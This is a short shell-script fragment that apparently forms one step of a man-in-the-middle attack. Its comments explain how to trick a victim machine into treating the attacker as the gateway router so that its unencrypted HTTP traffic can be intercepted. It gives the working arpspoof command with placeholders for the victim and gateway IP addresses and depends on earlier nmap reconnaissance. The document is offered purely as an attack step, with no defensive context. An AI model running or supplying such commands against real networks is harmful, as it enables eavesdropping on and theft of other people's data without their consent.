# in a new (third) terminal enable arpspoofing
# trick the victim into thinking that you are the gateway router,
# so it sends data over an unencrypted http connection
# requires the results from nmap in forward_table.sh to run
arpspoof -i eth0 -t <Victim IP> <Gateway IP>
